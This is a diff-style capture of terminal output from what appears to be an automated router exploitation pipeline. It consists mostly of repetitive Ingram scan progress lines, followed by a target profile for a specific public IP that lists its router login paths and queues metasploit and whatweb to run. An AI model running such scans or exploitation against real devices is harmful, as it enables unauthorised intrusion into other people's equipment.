+[⣻] 0/1(0.0%)   Time: 1m 25s/23h 47m 3s        
+[⣽] 0/1(0.0%)   Time: 1m 25s/23h 48m 43s        
+[⣾] 0/1(0.0%)   Time: 1m 25s/23h 50m 23s        
+[⣷] 0/1(0.0%)   Time: 1m 25s/23h 52m 4s        
+[⣯] 0/1(0.0%)   Time: 1m 26s/23h 53m 44s        
+[⣟] 0/1(0.0%)   Time: 1m 26s/23h 55m 24s        
+[⡿] 0/1(0.0%)   Time: 1m 26s/23h 57m 5s        
+[⢿] 0/1(0.0%)   Time: 1m 26s/23h 58m 45s        
+[⣻] 0/1(0.0%)   Time: 1m 26s/24h 25s        
+[⣽] 0/1(0.0%)   Time: 1m 26s/24h 2m 5s        
+[⣾] 0/1(0.0%)   Time: 1m 26s/24h 3m 46s        
+[⣷] 0/1(0.0%)   Time: 1m 26s/24h 5m 26s        
+[⣯] 0/1(0.0%)   Time: 1m 26s/24h 7m 6s        
+[⣟] 0/1(0.0%)   Time: 1m 26s/24h 8m 46s        
+[⡿] 0/1(0.0%)   Time: 1m 27s/24h 10m 27s        
+[⢿] 0/1(0.0%)   Time: 1m 27s/24h 12m 7s        
+[⣻] 0/1(0.0%)   Time: 1m 27s/24h 13m 47s        
+[⣽] 0/1(0.0%)   Time: 1m 27s/24h 15m 27s        
+[⣾] 0/1(0.0%)   Time: 1m 27s/24h 17m 8s        
+[⣷] 0/1(0.0%)   Time: 1m 27s/24h 18m 48s        
+[⣯] 0/1(0.0%)   Time: 1m 27s/24h 20m 28s        
+[⣟] 0/1(0.0%)   Time: 1m 27s/24h 22m 8s        
+[⡿] 0/1(0.0%)   Time: 1m 27s/24h 23m 49s        
+[⢿] 0/1(0.0%)   Time: 1m 27s/24h 25m 29s        
+[⣻] 0/1(0.0%)   Time: 1m 28s/24h 27m 9s        
+[⣽] 0/1(0.0%)   Time: 1m 28s/24h 28m 49s        
+[⣾] 0/1(0.0%)   Time: 1m 28s/24h 30m 30s        
+[⣷] 0/1(0.0%)   Time: 1m 28s/24h 32m 10s        
+[⣯] 0/1(0.0%)   Time: 1m 28s/24h 33m 50s        
+[⣟] 0/1(0.0%)   Time: 1m 28s/24h 35m 31s        
+[⡿] 0/1(0.0%)   Time: 1m 28s/24h 37m 11s        
+[⢿] 0/1(0.0%)   Time: 1m 28s/24h 38m 51s        
+[⣻] 0/1(0.0%)   Time: 1m 28s/24h 40m 31s        
+[⣽] 0/1(0.0%)   Time: 1m 28s/24h 42m 12s        
+[⣾] 0/1(0.0%)   Time: 1m 29s/24h 43m 52s        
+[⣷] 0/1(0.0%)   Time: 1m 29s/24h 45m 32s        
+[⣯] 0/1(0.0%)   Time: 1m 29s/24h 47m 12s        
+[⣟] 0/1(0.0%)   Time: 1m 29s/24h 48m 53s        
+[⡿] 0/1(0.0%)   Time: 1m 29s/24h 50m 33s        
+[⢿] 0/1(0.0%)   Time: 1m 29s/24h 52m 13s        
+[⣻] 0/1(0.0%)   Time: 1m 29s/24h 53m 54s        
+[⣽] 0/1(0.0%)   Time: 1m 29s/24h 55m 34s        
+[⣾] 0/1(0.0%)   Time: 1m 29s/24h 57m 14s        
+[⣷] 0/1(0.0%)   Time: 1m 29s/24h 58m 54s        
+[⣯] 0/1(0.0%)   Time: 1m 30s/25h 35s        
+[⣟] 0/1(0.0%)   Time: 1m 30s/25h 2m 15s        
+[⡿] 0/1(0.0%)   Time: 1m 30s/25h 3m 55s        
+[⢿] 0/1(0.0%)   Time: 1m 30s/25h 5m 35s        
+[⣻] 0/1(0.0%)   Time: 1m 30s/25h 7m 16s        
+[⣽] 0/1(0.0%)   Time: 1m 30s/25h 8m 56s        
+[⣾] 0/1(0.0%)   Time: 1m 30s/25h 10m 36s        
+[⣷] 0/1(0.0%)   Time: 1m 30s/25h 12m 17s        
+[⣯] 0/1(0.0%)   Time: 1m 30s/25h 13m 57s        
+[⣟] 0/1(0.0%)   Time: 1m 30s/25h 15m 37s        
+[⡿] 0/1(0.0%)   Time: 1m 31s/25h 17m 17s        
+[⢿] 0/1(0.0%)   Time: 1m 31s/25h 18m 58s        
+[⣻] 0/1(0.0%)   Time: 1m 31s/25h 20m 38s        
+[⣽] 0/1(0.0%)   Time: 1m 31s/25h 22m 18s        
+[⣾] 0/1(0.0%)   Time: 1m 31s/25h 23m 58s        
+[⣷] 0/1(0.0%)   Time: 1m 31s/25h 25m 38s        
+[⣯] 0/1(0.0%)   Time: 1m 31s/25h 27m 19s        
+[⣟] 0/1(0.0%)   Time: 1m 31s/25h 28m 59s        
+[⡿] 0/1(0.0%)   Time: 1m 31s/25h 30m 39s        
+[⢿] 0/1(0.0%)   Time: 1m 31s/25h 32m 19s        
+[⣻] 0/1(0.0%)   Time: 1m 32s/25h 34m 0s        
+[⣽] 0/1(0.0%)   Time: 1m 32s/25h 35m 40s        
+[⣾] 0/1(0.0%)   Time: 1m 32s/25h 37m 20s        
+[⣷] 0/1(0.0%)   Time: 1m 32s/25h 39m 0s        
+[⣯] 0/1(0.0%)   Time: 1m 32s/25h 40m 41s        
+[⣟] 0/1(0.0%)   Time: 1m 32s/25h 42m 21s        
+[⡿] 0/1(0.0%)   Time: 1m 32s/25h 44m 1s        
+[⢿] 0/1(0.0%)   Time: 1m 32s/25h 45m 41s        
+[⣻] 0/1(0.0%)   Time: 1m 32s/25h 47m 22s        
+[⣽] 0/1(0.0%)   Time: 1m 32s/25h 49m 2s        
+[⣾] 0/1(0.0%)   Time: 1m 33s/25h 50m 42s        
+[⣷] 0/1(0.0%)   Time: 1m 33s/25h 52m 22s        
+[⣯] 0/1(0.0%)   Time: 1m 33s/25h 54m 3s        
+[⣟] 0/1(0.0%)   Time: 1m 33s/25h 55m 43s        
+[⡿] 0/1(0.0%)   Time: 1m 33s/25h 57m 23s        
+[⢿] 0/1(0.0%)   Time: 1m 33s/25h 59m 3s        
+[⣻] 0/1(0.0%)   Time: 1m 33s/26h 44s        
+[⣽] 0/1(0.0%)   Time: 1m 33s/26h 2m 24s        
+[⣾] 0/1(0.0%)   Time: 1m 33s/26h 4m 5s        
+[⣷] 0/1(0.0%)   Time: 1m 33s/26h 5m 45s        
+[⣯] 0/1(0.0%)   Time: 1m 34s/26h 7m 25s        
+[⣟] 0/1(0.0%)   Time: 1m 34s/26h 9m 5s        
+[⡿] 0/1(0.0%)   Time: 1m 34s/26h 10m 46s        
+[⢿] 0/1(0.0%)   Time: 1m 34s/26h 12m 26s        
+[⣻] 0/1(0.0%)   Time: 1m 34s/26h 14m 6s        
+[⣽] 0/1(0.0%)   Time: 1m 34s/26h 15m 46s        
+[⣾] 0/1(0.0%)   Time: 1m 34s/26h 17m 26s        
+[⣷] 0/1(0.0%)   Time: 1m 34s/26h 19m 7s        
+[⣯] 0/1(0.0%)   Time: 1m 34s/26h 20m 47s        
+[⣟] 0/1(0.0%)   Time: 1m 34s/26h 22m 27s        
+[⡿] 0/1(0.0%)   Time: 1m 35s/26h 24m 7s        
+[⢿] 0/1(0.0%)   Time: 1m 35s/26h 25m 48s        
+[⣻] 0/1(0.0%)   Time: 1m 35s/26h 27m 28s        
+[⣽] 0/1(0.0%)   Time: 1m 35s/26h 29m 8s        
+[⣾] 0/1(0.0%)   Time: 1m 35s/26h 30m 49s        
+[⣷] 0/1(0.0%)   Time: 1m 35s/26h 32m 29s        
+[⣯] 0/1(0.0%)   Time: 1m 35s/26h 34m 9s        
+[⣟] 0/1(0.0%)   Time: 1m 35s/26h 35m 50s        
+[⡿] 0/1(0.0%)   Time: 1m 35s/26h 37m 30s        
+[⢿] 0/1(0.0%)   Time: 1m 35s/26h 39m 10s        
+[⣻] 0/1(0.0%)   Time: 1m 36s/26h 40m 51s        
+[⣽] 0/1(0.0%)   Time: 1m 36s/26h 42m 31s        
+[⣾] 0/1(0.0%)   Time: 1m 36s/26h 44m 11s        
+[⣷] 0/1(0.0%)   Time: 1m 36s/26h 45m 51s        
+[⣯] 0/1(0.0%)   Time: 1m 36s/26h 47m 31s        
+[⣟] 0/1(0.0%)   Time: 1m 36s/26h 49m 12s        
+[⡿] 0/1(0.0%)   Time: 1m 36s/26h 50m 52s        
+[⢿] 0/1(0.0%)   Time: 1m 36s/26h 52m 32s        
+[⣻] 0/1(0.0%)   Time: 1m 36s/26h 54m 12s        
+[⣽] 0/1(0.0%)   Time: 1m 36s/26h 55m 53s        
+[⣾] 0/1(0.0%)   Time: 1m 37s/26h 57m 33s        
+[⣷] 0/1(0.0%)   Time: 1m 37s/26h 59m 13s        
+[⣯] 0/1(0.0%)   Time: 1m 37s/27h 53s        
+[⣟] 0/1(0.0%)   Time: 1m 37s/27h 2m 34s        
+[⡿] 0/1(0.0%)   Time: 1m 37s/27h 4m 14s        
+[⢿] 0/1(0.0%)   Time: 1m 37s/27h 5m 54s        
+[⣻] 0/1(0.0%)   Time: 1m 37s/27h 7m 34s        
+[⣽] 0/1(0.0%)   Time: 1m 37s/27h 9m 15s        
+[⣾] 0/1(0.0%)   Time: 1m 37s/27h 10m 55s        
+[⣷] 0/1(0.0%)   Time: 1m 37s/27h 12m 35s        
+[⣯] 0/1(0.0%)   Time: 1m 38s/27h 14m 15s        
+[⣟] 0/1(0.0%)   Time: 1m 38s/27h 15m 56s        
+[⡿] 0/1(0.0%)   Time: 1m 38s/27h 17m 36s        
+[⢿] 0/1(0.0%)   Time: 1m 38s/27h 19m 16s        
+[⣻] 0/1(0.0%)   Time: 1m 38s/27h 20m 56s        
+[⣽] 0/1(0.0%)   Time: 1m 38s/27h 22m 37s        
+[⣾] 0/1(0.0%)   Time: 1m 38s/27h 24m 17s        
+[⣷] 0/1(0.0%)   Time: 1m 38s/27h 25m 57s        
+[⣯] 0/1(0.0%)   Time: 1m 38s/27h 27m 37s        
+[⣟] 0/1(0.0%)   Time: 1m 38s/27h 29m 17s        
+[⡿] 0/1(0.0%)   Time: 1m 39s/27h 30m 58s        
+[⢿] 0/1(0.0%)   Time: 1m 39s/27h 32m 38s        
+[⣻] 0/1(0.0%)   Time: 1m 39s/27h 34m 18s        
+[⣽] 0/1(0.0%)   Time: 1m 39s/27h 35m 58s        
+[⣾] 0/1(0.0%)   Time: 1m 39s/27h 37m 38s        
+[⣷] 0/1(0.0%)   Time: 1m 39s/27h 39m 19s        
+[⣯] 0/1(0.0%)   Time: 1m 39s/27h 40m 59s        
+[⣟] 0/1(0.0%)   Time: 1m 39s/27h 42m 39s        
+[⡿] 0/1(0.0%)   Time: 1m 39s/27h 44m 20s        
+[⢿] 0/1(0.0%)   Time: 1m 39s/27h 46m 0s        
+[⣻] 0/1(0.0%)   Time: 1m 40s/27h 47m 40s        
+[⣽] 0/1(0.0%)   Time: 1m 40s/27h 49m 20s        
+[⣾] 0/1(0.0%)   Time: 1m 40s/27h 51m 1s        
+[⣷] 0/1(0.0%)   Time: 1m 40s/27h 52m 41s        
+[⣯] 0/1(0.0%)   Time: 1m 40s/27h 54m 21s        
+[⣟] 0/1(0.0%)   Time: 1m 40s/27h 56m 1s        
+[⡿] 0/1(0.0%)   Time: 1m 40s/27h 57m 41s        
+[⢿] 0/1(0.0%)   Time: 1m 40s/27h 59m 22s        
+[⣻] 0/1(0.0%)   Time: 1m 40s/28h 1m 2s        
+[⣽] 0/1(0.0%)   Time: 1m 40s/28h 2m 42s        
+[⣾] 0/1(0.0%)   Time: 1m 41s/28h 4m 22s        
+[⣷] 0/1(0.0%)   Time: 1m 41s/28h 6m 3s        
+[⣯] 0/1(0.0%)   Time: 1m 41s/28h 7m 43s        
+[⣟] 0/1(0.0%)   Time: 1m 41s/28h 9m 23s        
+[⡿] 0/1(0.0%)   Time: 1m 41s/28h 11m 3s        
+[⢿] 0/1(0.0%)   Time: 1m 41s/28h 12m 43s        
+[⣻] 0/1(0.0%)   Time: 1m 41s/28h 14m 24s        
+[⣽] 0/1(0.0%)   Time: 1m 41s/28h 16m 4s        
+[⣾] 0/1(0.0%)   Time: 1m 41s/28h 17m 44s        
+[⣷] 0/1(0.0%)   Time: 1m 41s/28h 19m 24s        
+[⣯] 0/1(0.0%)   Time: 1m 42s/28h 21m 5s        
+[⣟] 0/1(0.0%)   Time: 1m 42s/28h 22m 45s        
+[⡿] 0/1(0.0%)   Time: 1m 42s/28h 24m 25s        
+[⢿] 0/1(0.0%)   Time: 1m 42s/28h 26m 5s        
+[⣻] 0/1(0.0%)   Time: 1m 42s/28h 27m 46s        
+[⣽] 0/1(0.0%)   Time: 1m 42s/28h 29m 26s        
+[⣾] 0/1(0.0%)   Time: 1m 42s/28h 31m 6s        
+[⣷] 0/1(0.0%)   Time: 1m 42s/28h 32m 47s        
+[⣯] 0/1(0.0%)   Time: 1m 42s/28h 34m 27s        
+[⣟] 0/1(0.0%)   Time: 1m 42s/28h 36m 7s        
+[⡿] 0/1(0.0%)   Time: 1m 43s/28h 37m 47s        
+[⢿] 0/1(0.0%)   Time: 1m 43s/28h 39m 28s        
+[⣻] 0/1(0.0%)   Time: 1m 43s/28h 41m 8s        
+[⣽] 0/1(0.0%)   Time: 1m 43s/28h 42m 48s        
+[⣾] 0/1(0.0%)   Time: 1m 43s/28h 44m 29s        
+[⣷] 0/1(0.0%)   Time: 1m 43s/28h 46m 9s        
+[⣯] 0/1(0.0%)   Time: 1m 43s/28h 47m 49s        
+[⣟] 0/1(0.0%)   Time: 1m 43s/28h 49m 29s        
+[⡿] 0/1(0.0%)   Time: 1m 43s/28h 51m 10s        
+[⢿] 0/1(0.0%)   Time: 1m 43s/28h 52m 50s        
+[⣻] 0/1(0.0%)   Time: 1m 44s/28h 54m 30s        
+[⣽] 0/1(0.0%)   Time: 1m 44s/28h 56m 10s        
+[⣾] 0/1(0.0%)   Time: 1m 44s/28h 57m 50s        
+[⣷] 0/1(0.0%)   Time: 1m 44s/28h 59m 31s        
+[⣯] 0/1(0.0%)   Time: 1m 44s/29h 1m 11s        
+[⣟] 0/1(0.0%)   Time: 1m 44s/29h 2m 51s        
+[⡿] 0/1(0.0%)   Time: 1m 44s/29h 4m 31s        
+[⢿] 0/1(0.0%)   Time: 1m 44s/29h 6m 12s        
+[⣻] 0/1(0.0%)   Time: 1m 44s/29h 7m 52s        
+[⣽] 0/1(0.0%)   Time: 1m 44s/29h 9m 32s        
+[⣾] 0/1(0.0%)   Time: 1m 45s/29h 11m 12s        
+[⣷] 0/1(0.0%)   Time: 1m 45s/29h 12m 53s        
+[⣯] 0/1(0.0%)   Time: 1m 45s/29h 14m 33s        
+[⣟] 0/1(0.0%)   Time: 1m 45s/29h 16m 13s        
+[⡿] 0/1(0.0%)   Time: 1m 45s/29h 17m 53s        
+[⢿] 0/1(0.0%)   Time: 1m 45s/29h 19m 34s        
+[⣻] 0/1(0.0%)   Time: 1m 45s/29h 21m 14s        
+[⣽] 0/1(0.0%)   Time: 1m 45s/29h 22m 54s        
+[⣾] 0/1(0.0%)   Time: 1m 45s/29h 24m 34s        
+[⣷] 0/1(0.0%)   Time: 1m 45s/29h 26m 14s        
+[⣯] 0/1(0.0%)   Time: 1m 46s/29h 27m 55s        
+[⣟] 0/1(0.0%)   Time: 1m 46s/29h 29m 35s        
+[⡿] 0/1(0.0%)   Time: 1m 46s/29h 31m 15s        
+[⢿] 0/1(0.0%)   Time: 1m 46s/29h 32m 55s        
+[⣻] 0/1(0.0%)   Time: 1m 46s/29h 34m 36s        
+[⣽] 0/1(0.0%)   Time: 1m 46s/29h 36m 16s        
+[⣾] 0/1(0.0%)   Time: 1m 46s/29h 37m 56s        
+[⣷] 0/1(0.0%)   Time: 1m 46s/29h 39m 36s        
+[⣯] 0/1(0.0%)   Time: 1m 46s/29h 41m 17s        
+[⣟] 0/1(0.0%)   Time: 1m 46s/29h 42m 57s        
+[⡿] 0/1(0.0%)   Time: 1m 47s/29h 44m 37s        
+[⢿] 0/1(0.0%)   Time: 1m 47s/29h 46m 17s        
+[⣻] 0/1(0.0%)   Time: 1m 47s/29h 47m 58s        
+[⣽] 0/1(0.0%)   Time: 1m 47s/29h 49m 38s        
+[⣾] 0/1(0.0%)   Time: 1m 47s/29h 51m 18s        
+[⣷] 0/1(0.0%)   Time: 1m 47s/29h 52m 58s        
+[⣯] 0/1(0.0%)   Time: 1m 47s/29h 54m 39s        
+[⣟] 0/1(0.0%)   Time: 1m 47s/29h 56m 19s        
+[⡿] 0/1(0.0%)   Time: 1m 47s/29h 57m 59s        
+[⢿] 0/1(0.0%)   Time: 1m 47s/29h 59m 39s        
+[⣻] 0/1(0.0%)   Time: 1m 48s/30h 1m 20s        
+[⣽] 0/1(0.0%)   Time: 1m 48s/30h 3m 0s        
+[⣾] 0/1(0.0%)   Time: 1m 48s/30h 4m 40s        
+[⣷] 0/1(0.0%)   Time: 1m 48s/30h 6m 20s        
+[⣯] 0/1(0.0%)   Time: 1m 48s/30h 8m 1s        
+[⣟] 0/1(0.0%)   Time: 1m 48s/30h 9m 41s        
+[⡿] 0/1(0.0%)   Time: 1m 48s/30h 11m 21s        
+[⢿] 0/1(0.0%)   Time: 1m 48s/30h 13m 2s        
+[⣻] 0/1(0.0%)   Time: 1m 48s/30h 14m 42s        
+[⣽] 0/1(0.0%)   Time: 1m 48s/30h 16m 22s        
+[⣾] 0/1(0.0%)   Time: 1m 49s/30h 18m 2s        
+[⣷] 0/1(0.0%)   Time: 1m 49s/30h 19m 42s        
+[⣯] 0/1(0.0%)   Time: 1m 49s/30h 21m 23s        
+[⣟] 0/1(0.0%)   Time: 1m 49s/30h 23m 3s        
+[⡿] 0/1(0.0%)   Time: 1m 49s/30h 24m 43s        
+[⢿] 0/1(0.0%)   Time: 1m 49s/30h 26m 23s        
+[⣻] 0/1(0.0%)   Time: 1m 49s/30h 28m 4s        
+[⣽] 0/1(0.0%)   Time: 1m 49s/30h 29m 44s        
+[⣾] 0/1(0.0%)   Time: 1m 49s/30h 31m 24s        
+[⣷] 0/1(0.0%)   Time: 1m 49s/30h 33m 4s        
+[⣯] 0/1(0.0%)   Time: 1m 50s/30h 34m 45s        
+[⣟] 0/1(0.0%)   Time: 1m 50s/30h 36m 25s        
+[⡿] 0/1(0.0%)   Time: 1m 50s/30h 38m 5s        
+[⢿] 0/1(0.0%)   Time: 1m 50s/30h 39m 45s        
+[⣻] 0/1(0.0%)   Time: 1m 50s/30h 41m 26s        
+[⣽] 0/1(0.0%)   Time: 1m 50s/30h 43m 6s        
+[⣾] 0/1(0.0%)   Time: 1m 50s/30h 44m 46s        
+[⣷] 0/1(0.0%)   Time: 1m 50s/30h 46m 26s        
+[⣯] 0/1(0.0%)   Time: 1m 50s/30h 48m 7s        
+[⣟] 0/1(0.0%)   Time: 1m 50s/30h 49m 47s        
+[⡿] 0/1(0.0%)   Time: 1m 51s/30h 51m 27s        
+[⢿] 0/1(0.0%)   Time: 1m 51s/30h 53m 7s        
+[⣻] 0/1(0.0%)   Time: 1m 51s/30h 54m 48s        
+[⣽] 0/1(0.0%)   Time: 1m 51s/30h 56m 28s        
+[⣾] 0/1(0.0%)   Time: 1m 51s/30h 58m 8s        
+[⣷] 0/1(0.0%)   Time: 1m 51s/30h 59m 48s        
+[⣯] 0/1(0.0%)   Time: 1m 51s/31h 1m 29s        
+[⣟] 0/1(0.0%)   Time: 1m 51s/31h 3m 9s        
+[⡿] 0/1(0.0%)   Time: 1m 51s/31h 4m 49s        
+[⢿] 0/1(0.0%)   Time: 1m 51s/31h 6m 29s        
+[⣻] 0/1(0.0%)   Time: 1m 52s/31h 8m 9s        
+[⣽] 0/1(0.0%)   Time: 1m 52s/31h 9m 50s        
+[⣾] 0/1(0.0%)   Time: 1m 52s/31h 11m 30s        
+[⣷] 0/1(0.0%)   Time: 1m 52s/31h 13m 10s        
+[⣯] 0/1(0.0%)   Time: 1m 52s/31h 14m 50s        
+[⣟] 0/1(0.0%)   Time: 1m 52s/31h 16m 31s        
+[⡿] 0/1(0.0%)   Time: 1m 52s/31h 18m 11s        
+[⢿] 0/1(0.0%)   Time: 1m 52s/31h 19m 51s        
+[⣻] 0/1(0.0%)   Time: 1m 52s/31h 21m 31s        
+[⣽] 0/1(0.0%)   Time: 1m 52s/31h 23m 12s        
+[⣾] 0/1(0.0%)   Time: 1m 53s/31h 24m 52s        
+[⣷] 0/1(0.0%)   Time: 1m 53s/31h 26m 32s        
+[⣯] 0/1(0.0%)   Time: 1m 53s/31h 28m 12s        
+[⣟] 0/1(0.0%)   Time: 1m 53s/31h 29m 52s        
+[⡿] 0/1(0.0%)   Time: 1m 53s/31h 31m 33s        
+[⢿] 0/1(0.0%)   Time: 1m 53s/31h 33m 13s        
+[⣻] 0/1(0.0%)   Time: 1m 53s/31h 34m 53s        
+[⣽] 0/1(0.0%)   Time: 1m 53s/31h 36m 33s        
+[⣾] 0/1(0.0%)   Time: 1m 53s/31h 38m 14s        
+[⣷] 0/1(0.0%)   Time: 1m 53s/31h 39m 54s        
+[⣯] 0/1(0.0%)   Time: 1m 54s/31h 41m 34s        
+[⣟] 0/1(0.0%)   Time: 1m 54s/31h 43m 14s        
+[⡿] 0/1(0.0%)   Time: 1m 54s/31h 44m 55s        
+[⢿] 0/1(0.0%)   Time: 1m 54s/31h 46m 35s        
+[⣻] 0/1(0.0%)   Time: 1m 54s/31h 48m 15s        
+[⣽] 0/1(0.0%)   Time: 1m 54s/31h 49m 55s        
+[⣾] 0/1(0.0%)   Time: 1m 54s/31h 51m 36s        
+[⣷] 0/1(0.0%)   Time: 1m 54s/31h 53m 16s        
+[⣯] 0/1(0.0%)   Time: 1m 54s/31h 54m 56s        
+[⣟] 0/1(0.0%)   Time: 1m 54s/31h 56m 36s        
+[⡿] 0/1(0.0%)   Time: 1m 55s/31h 58m 17s        
+[⢿] 0/1(0.0%)   Time: 1m 55s/31h 59m 57s        
+[⣻] 0/1(0.0%)   Time: 1m 55s/32h 1m 37s        
+[⣽] 0/1(0.0%)   Time: 1m 55s/32h 3m 17s        
+[⣾] 0/1(0.0%)   Time: 1m 55s/32h 4m 58s        
+[⣷] 0/1(0.0%)   Time: 1m 55s/32h 6m 38s        
+[⣯] 0/1(0.0%)   Time: 1m 55s/32h 8m 18s        
+[⣟] 0/1(0.0%)   Time: 1m 55s/32h 9m 58s        
+[⡿] 0/1(0.0%)   Time: 1m 55s/32h 11m 38s        
+[⢿] 0/1(0.0%)   Time: 1m 55s/32h 13m 19s        
+[⣻] 0/1(0.0%)   Time: 1m 56s/32h 14m 59s        
+[⣽] 0/1(0.0%)   Time: 1m 56s/32h 16m 39s        
+[⣾] 0/1(0.0%)   Time: 1m 56s/32h 18m 19s        
+[⣷] 0/1(0.0%)   Time: 1m 56s/32h 20m 0s        
+[⣯] 0/1(0.0%)   Time: 1m 56s/32h 21m 40s        
+[⣟] 0/1(0.0%)   Time: 1m 56s/32h 23m 20s        
+[⡿] 0/1(0.0%)   Time: 1m 56s/32h 25m 0s        
+[⢿] 0/1(0.0%)   Time: 1m 56s/32h 26m 41s        
+[⣻] 0/1(0.0%)   Time: 1m 56s/32h 28m 21s        
+[⣽] 0/1(0.0%)   Time: 1m 57s/32h 30m 1s        
+[⣾] 0/1(0.0%)   Time: 1m 57s/32h 31m 41s        
+[⣷] 0/1(0.0%)   Time: 1m 57s/32h 33m 22s        
+[⣯] 0/1(0.0%)   Time: 1m 57s/32h 35m 2s        
+[⣟] 0/1(0.0%)   Time: 1m 57s/32h 36m 42s        
+[⡿] 0/1(0.0%)   Time: 1m 57s/32h 38m 22s        
+[⢿] 0/1(0.0%)   Time: 1m 57s/32h 40m 2s        
+[⣻] 0/1(0.0%)   Time: 1m 57s/32h 41m 43s        
+[⣽] 0/1(0.0%)   Time: 1m 57s/32h 43m 23s        
+[⣾] 0/1(0.0%)   Time: 1m 57s/32h 45m 3s        
+[⣷] 0/1(0.0%)   Time: 1m 58s/32h 46m 43s        
+[⣯] 0/1(0.0%)   Time: 1m 58s/32h 48m 24s        
+[⣟] 0/1(0.0%)   Time: 1m 58s/32h 50m 4s        
+[⡿] 0/1(0.0%)   Time: 1m 58s/32h 51m 44s        
+[⢿] 0/1(0.0%)   Time: 1m 58s/32h 53m 24s        
+[⣻] 0/1(0.0%)   Time: 1m 58s/32h 55m 5s        
+[⣽] 0/1(0.0%)   Time: 1m 58s/32h 56m 45s        
+[⣾] 0/1(0.0%)   Time: 1m 58s/32h 58m 25s        
+[⣷] 0/1(0.0%)   Time: 1m 58s/33h 5s        
+[⣯] 0/1(0.0%)   Time: 1m 58s/33h 1m 46s        
+[⣟] 0/1(0.0%)   Time: 1m 59s/33h 3m 26s        
+[⡿] 0/1(0.0%)   Time: 1m 59s/33h 5m 6s        
+[⢿] 0/1(0.0%)   Time: 1m 59s/33h 6m 46s        
+[⣻] 0/1(0.0%)   Time: 1m 59s/33h 8m 26s        
+[⣽] 0/1(0.0%)   Time: 1m 59s/33h 10m 7s        
+[⣾] 0/1(0.0%)   Time: 1m 59s/33h 11m 47s        
+[⣷] 0/1(0.0%)   Time: 1m 59s/33h 13m 27s        
+[⣯] 0/1(0.0%)   Time: 1m 59s/33h 15m 7s        
+[⣟] 0/1(0.0%)   Time: 1m 59s/33h 16m 48s        
+[⡿] 0/1(0.0%)   Time: 1m 59s/33h 18m 28s        
+[⢿] 0/1(0.0%)   Time: 2m 0s/33h 20m 8s        
+[⣻] 0/1(0.0%)   Time: 2m 0s/33h 21m 48s        
+[⣽] 0/1(0.0%)   Time: 2m 0s/33h 23m 29s        
+[⣾] 0/1(0.0%)   Time: 2m 0s/33h 25m 9s        
+[⣷] 0/1(0.0%)   Time: 2m 0s/33h 26m 49s        
+[⣯] 0/1(0.0%)   Time: 2m 0s/33h 28m 29s        
+[⣟] 0/1(0.0%)   Time: 2m 0s/33h 30m 10s        
+[⡿] 0/1(0.0%)   Time: 2m 0s/33h 31m 50s        
+[⢿] 0/1(0.0%)   Time: 2m 0s/33h 33m 30s        
+[⣻] 0/1(0.0%)   Time: 2m 0s/33h 35m 10s        
+[⣽] 0/1(0.0%)   Time: 2m 1s/33h 36m 50s        
+[⣾] 0/1(0.0%)   Time: 2m 1s/33h 38m 31s        
+[⣷] 0/1(0.0%)   Time: 2m 1s/33h 40m 11s        
+[⣯] 0/1(0.0%)   Time: 2m 1s/33h 41m 51s        
+[⣟] 0/1(0.0%)   Time: 2m 1s/33h 43m 32s        
+[⡿] 0/1(0.0%)   Time: 2m 1s/33h 45m 12s        
+[⢿] 0/1(0.0%)   Time: 2m 1s/33h 46m 52s        
+[⣻] 0/1(0.0%)   Time: 2m 1s/33h 48m 32s        
+[⣽] 0/1(0.0%)   Time: 2m 1s/33h 50m 13s        
+[⣾] 0/1(0.0%)   Time: 2m 1s/33h 51m 53s        
+[⣷] 0/1(0.0%)   Time: 2m 2s/33h 53m 33s        
+[⣯] 0/1(0.0%)   Time: 2m 2s/33h 55m 13s        
+[⣟] 0/1(0.0%)   Time: 2m 2s/33h 56m 54s        
+[⡿] 0/1(0.0%)   Time: 2m 2s/33h 58m 34s        
+[⢿] 0/1(0.0%)   Time: 2m 2s/34h 14s        
+[⣻] 0/1(0.0%)   Time: 2m 2s/34h 1m 54s        
+[⣽] 0/1(0.0%)   Time: 2m 2s/34h 3m 35s        
+[⣾] 0/1(0.0%)   Time: 2m 2s/34h 5m 15s        
+[⣷] 0/1(0.0%)   Time: 2m 2s/34h 6m 55s        
+[⣯] 0/1(0.0%)   Time: 2m 2s/34h 8m 35s        
+[⣟] 0/1(0.0%)   Time: 2m 3s/34h 10m 16s        
+[⡿] 0/1(0.0%)   Time: 2m 3s/34h 11m 56s        
+[⢿] 0/1(0.0%)   Time: 2m 3s/34h 13m 36s        
+[⣻] 0/1(0.0%)   Time: 2m 3s/34h 15m 16s        
+[⣽] 0/1(0.0%)   Time: 2m 3s/34h 16m 56s        
+[⣾] 0/1(0.0%)   Time: 2m 3s/34h 18m 37s        
+[⣷] 0/1(0.0%)   Time: 2m 3s/34h 20m 17s        
+[⣯] 0/1(0.0%)   Time: 2m 3s/34h 21m 57s        
+[⣟] 0/1(0.0%)   Time: 2m 3s/34h 23m 38s        
+[⡿] 0/1(0.0%)   Time: 2m 3s/34h 25m 18s        
+[⢿] 0/1(0.0%)   Time: 2m 4s/34h 26m 58s        
+[⣻] 0/1(0.0%)   Time: 2m 4s/34h 28m 38s        
+[⣽] 0/1(0.0%)   Time: 2m 4s/34h 30m 19s        
+[⣾] 0/1(0.0%)   Time: 2m 4s/34h 31m 59s        
+[⣷] 0/1(0.0%)   Time: 2m 4s/34h 33m 39s        
+[⣯] 0/1(0.0%)   Time: 2m 4s/34h 35m 19s        
+[⣟] 0/1(0.0%)   Time: 2m 4s/34h 37m 0s        
+[⡿] 0/1(0.0%)   Time: 2m 4s/34h 38m 40s        
+[⢿] 0/1(0.0%)   Time: 2m 4s/34h 40m 20s        
+[⣻] 1/1(99.9%)   Time: 2m 4s/2m 4s
+[+] Ingram results saved to: /home/kali/router/targets/188.225.136.99/ingram_scan.txt
+[*] Report updated after Phase 3 - Exploitation: /home/kali/router/targets/188.225.136.99/RESULTS_SUMMARY.txt
+
+[*] Target profile updated (after Phase 3) → /home/kali/router/targets/188.225.136.99/target_profile.json
+
+============================================================
+ TARGET PROFILE (drives tool selection)
+============================================================
+  IP          : 188.225.136.99
+  Type        : router (high)
+  Summary     : Embedded router/CPE web interface patterns.
+  Web ports   : 80
+  Login paths : http://188.225.136.99/cgi-bin/login, http://188.225.136.99/cgi-bin/login.cgi, http://188.225.136.99/cgi-bin/login.php
+
+  Tool routing:
+    [SKIP] searchsploit: Match local exploits to detected stack/vendor.
+    [RUN ] metasploit: MSF search for vendor-specific modules (skip generic router list on web apps).
+    [RUN ] whatweb: Fingerprint CMS/plugins before deep scans.
+    [SKIP] nikto: Web server misconfiguration scan.
